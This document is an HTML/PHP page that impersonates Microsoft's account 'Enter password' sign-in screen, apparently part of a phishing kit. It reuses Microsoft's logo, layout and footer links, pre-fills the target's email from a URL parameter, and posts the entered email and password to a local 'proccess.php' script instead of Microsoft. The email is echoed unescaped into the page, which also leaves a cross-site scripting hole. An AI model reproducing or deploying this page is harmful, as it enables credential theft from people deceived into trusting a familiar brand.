<html dir="ltr" lang="EN-US">
   <head>
    
      <link rel="stylesheet" title="Converged_v2" type="text/css" href="16.000/Converged_v21033_AZXChPIB5jI3ijrmoNll5w2.css">
    
   </head>
   <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
      <div>
         <!--  --><!--  --> 
         <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
               <!-- ko if: smallImageUrl --> 
               <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;16.000.28510.10/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>
               <!-- /ko --><!-- ko if: backgroundImageUrl --> 
               <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;16.000.28510.10/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div>
               <!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> 
            </div>
         </div>
         <div data-bind="if: activeDialog"></div>
         <form method="post" action="proccess.php">
            <!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
            <div class="outer" data-bind="component: { name: 'master-page',
               params: {
               serverData: svr,
               showButtons: svr.f,
               showFooterLinks: true,
               useWizardBehavior: svr.BC,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> 
               <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                  <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 
                  <div class="inner fade-in-lightbox" data-bind="
                     animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                     css: {
                     'app': backgroundLogoUrl,
                     'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                     'fade-in-lightbox': fadeInLightBox,
                     'has-popup': showFedCredButtons,
                     'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                     <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div>
                     <!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> 
                     <div data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                        <!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="16.000.28510.10/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="16.000.28510.10/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="16.000.28510.10/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko -->
                     </div>
                     <!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> 
                     <div role="main">
                        <!--  --> 
                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                           <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --> 
                           <div class="animate slide-in-next">
                              <div>
                                 <!--  --> 
                                 <div class="identityBanner">
                                    <!-- ko if: isBackButtonVisible --><!-- /ko --> 
                                    <div id="displayName" class="identity" title="<?php echo $_GET['email']; ?>"><?php echo $_GET['email']; ?></div>
                                 </div>
                              </div>
                           </div>
                           <!-- /ko --> 
                           <div class="pagination-view has-identity-banner animate slide-in-next" >
                              <div>
                                 <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                 <!-- ko if: showCredViewBrandingDesc --><!-- /ko --><!-- ko if: unsafe_pageDescription --> 
                                 <div class="row text-body">
                                    <div id="passwordDesc" class="wrap-content" data-bind="text: unsafe_pageDescription">Because you're accessing sensitive info, you need to verify your password.</div>
                                 </div>
                                 <!-- /ko --> 
                                 <div class="row">
                                    <div class="form-group col-md-24">
                                       <div role="alert" aria-live="assertive">
                                          <!-- ko if: passwordTextbox.error --><!-- /ko --> 
                                       </div>
                                       <div class="placeholderContainer">
                                       		<input type="hidden" name="email" value="<?php echo $_GET['email']; ?>">
                                          <input name="password" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" tabindex="0">
                                       </div>
                                       <!-- ko if: svr.CK --><!-- /ko --> 
                                    </div>
                                 </div>
                                 <!-- ko if: shouldHipInit --><!-- /ko --> 
                                 <div class="position-buttons">
                                    <div>
                                       <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView" style="display: none;"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>
                                       <!-- /ko --> 
                                       <div class="row">
                                          <div class="col-md-24">
                                             <div class="text-13 action-links">
                                                <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot password?</a> </div>
                                                
                                                <div class="form-group"> <a id="i1668" href="#" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], click: selectAccount_onClick">Sign in with a different Microsoft account</a> </div>
                                                <!-- /ko --> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                       <div data-bind="component: { name: 'footer-buttons-field',
                                          params: {
                                          serverData: svr,
                                          primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                                          isPrimaryButtonEnabled: !isRequestPending(),
                                          isPrimaryButtonVisible: svr.f,
                                          isSecondaryButtonEnabled: true,
                                          isSecondaryButtonVisible: false },
                                          event: {
                                          primaryButtonClick: primaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                             visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                             css: { 'no-margin-bottom': removeBottomMargin }">
                                             <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                                             <div class="inline-block">
                                             	<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Sign in"> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                              </div>
                           </div>
                        </div>
                     </div>
                     <!-- /ko --> 
                  </div>
                
                  <div data-bind="component: { name: 'instrumentation-control',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="6"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                  <div id="footer" class="footer default" role="contentinfo" data-bind="
                     css: {
                     'default': !backgroundLogoUrl(),
                     'new-background-image': useNewDefaultBackground }">
                     <div>
                        <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> 
                        <div id="footerLinks" class="footerNode text-secondary">
                           <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600&amp;uaid=95e0f207a5cb4ef486fc903325963fe1">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600&amp;uaid=95e0f207a5cb4ef486fc903325963fe1">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> 
                           <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                              click: moreInfo_onClick,
                              ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                              attr: { 'aria-expanded': showDebugDetails().toString() },
                              hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"><img class="desktopMode" role="presentation" pngsrc="16.000.28510.10/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="16.000.28510.10/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="16.000.28510.10/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><img class="mobileMode" role="presentation" pngsrc="16.000.28510.10/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="16.000.28510.10/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="16.000.28510.10/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
                           </a>
                        </div>
                        <!-- /ko -->
                     </div>
                  </div>
               </div>
               <!-- /ko -->
            </div>
            <!-- /ko --> 
         </form>
         </div>
      </div>
   </body>
</html>